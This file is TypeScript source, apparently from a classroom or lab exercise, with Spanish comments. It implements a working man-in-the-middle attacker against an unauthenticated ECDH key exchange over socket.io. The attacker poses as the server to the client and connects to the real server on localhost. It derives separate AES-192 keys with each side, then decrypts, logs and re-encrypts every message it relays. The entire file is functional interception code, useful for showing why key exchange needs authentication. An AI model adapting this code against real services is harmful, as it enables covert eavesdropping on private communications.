// attacker/index.ts
import { Server } from 'socket.io'
import { io as ClientIO } from 'socket.io-client'
import http from 'http'
import crypto from 'crypto'
import {
    deriveAES192Key,
    encryptAES192CBC,
    decryptAES192CBC
} from '../../scenario_2/cryptoUtils'

const attackerECDH_Client = crypto.createECDH('prime256v1')
attackerECDH_Client.generateKeys()
const attackerPublicKey_Client = attackerECDH_Client.getPublicKey()

const attackerECDH_Server = crypto.createECDH('prime256v1')
attackerECDH_Server.generateKeys()
const attackerPublicKey_Server = attackerECDH_Server.getPublicKey()

// MITM se comporta como "Servidor" para el Cliente
const mitmServer = http.createServer()
const io = new Server(mitmServer)

let aesWithClient: Buffer
let aesWithServer: Buffer
let serverSocket: any

io.on('connection', (clientSocket) => {
    console.log('🕵️ Cliente conectado al atacante')

    // Enviamos nuestra clave pública falsa al cliente
    clientSocket.emit('server-public-key', attackerPublicKey_Client.toString('base64'))

    // Recibimos la clave pública del cliente
    clientSocket.on('client-public-key', (clientPubKeyBase64: string) => {
        const clientPubKey = Buffer.from(clientPubKeyBase64, 'base64')
        const sharedSecretWithClient = attackerECDH_Client.computeSecret(clientPubKey)
        aesWithClient = deriveAES192Key(sharedSecretWithClient)

        console.log('🕵️ Obtuve la clave compartida con el cliente')

        // Ahora nos conectamos al servidor real
        const serverConn = ClientIO('http://localhost:3000')
        serverSocket = serverConn

        serverConn.on('connect', () => {
            console.log('🕵️ Conectado al servidor real')
            // Esperamos la clave pública real del servidor
        })

        serverConn.on('server-public-key', (serverPubKeyBase64: string) => {
            const serverPubKey = Buffer.from(serverPubKeyBase64, 'base64')
            const sharedSecretWithServer = attackerECDH_Server.computeSecret(serverPubKey)
            aesWithServer = deriveAES192Key(sharedSecretWithServer)

            console.log('🕵️ Obtuve la clave compartida con el servidor')

            // Le mandamos al servidor nuestra clave falsa
            serverConn.emit('client-public-key', attackerPublicKey_Server.toString('base64'))
        })

        // Comunicación desde el servidor real
        serverConn.on('secure-message', ({ iv, ciphertext }) => {
            const msgFromServer = decryptAES192CBC(Buffer.from(ciphertext, 'base64'), aesWithServer, Buffer.from(iv, 'base64'))
            console.log(`📥 Servidor dijo: ${msgFromServer}`)

            // Reenviamos al cliente
            const { iv: newIv, ciphertext: newCiphertext } = encryptAES192CBC(msgFromServer, aesWithClient)
            clientSocket.emit('secure-message', {
                iv: newIv.toString('base64'),
                ciphertext: newCiphertext.toString('base64')
            })
        })

        // Comunicación desde el cliente
        clientSocket.on('secure-reply', ({ iv, ciphertext }) => {
            const msgFromClient = decryptAES192CBC(Buffer.from(ciphertext, 'base64'), aesWithClient, Buffer.from(iv, 'base64'))
            console.log(`📤 Cliente dijo: ${msgFromClient}`)

            // Reenviamos al servidor
            const { iv: newIv, ciphertext: newCiphertext } = encryptAES192CBC(msgFromClient, aesWithServer)
            serverSocket.emit('secure-reply', {
                iv: newIv.toString('base64'),
                ciphertext: newCiphertext.toString('base64')
            })
        })
    })
})

mitmServer.listen(4000, () => {
    console.log('🟢 Atacante escuchando en puerto 4000')
})
